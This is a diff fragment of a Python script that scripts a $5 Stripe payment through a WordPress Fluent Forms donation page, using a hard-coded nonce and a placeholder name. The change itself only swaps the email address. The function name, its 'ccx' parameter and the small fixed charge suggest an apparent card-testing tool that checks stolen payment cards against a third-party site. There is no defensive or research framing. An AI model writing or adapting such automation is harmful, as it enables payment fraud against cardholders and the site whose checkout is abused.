@@ -75,7 +75,7 @@ def Tele(ccx):
 
     # Data for the second request
     data_2 = {
-        'data': '__fluent_form_embded_post_id=3500&_fluentform_3_fluentformnonce=f58e6c4dec&_wp_http_referer=%2Fcontribute%2F&payment_input_1=5&email=test%40gmail.com&names_1%5Bfirst_name%5D=waznim&names_1%5Blast_name%5D=ey%20ey&payment_method=stripe&checkbox%5B%5D=&__stripe_payment_method_id=' + str(pm),
+        'data': '__fluent_form_embded_post_id=3500&_fluentform_3_fluentformnonce=f58e6c4dec&_wp_http_referer=%2Fcontribute%2F&payment_input_1=5&email=waznimey%40gmail.com&names_1%5Bfirst_name%5D=waznim&names_1%5Blast_name%5D=ey%20ey&payment_method=stripe&checkbox%5B%5D=&__stripe_payment_method_id=' + str(pm),
         'action': 'fluentform_submit',
         'form_id': '3',
     }
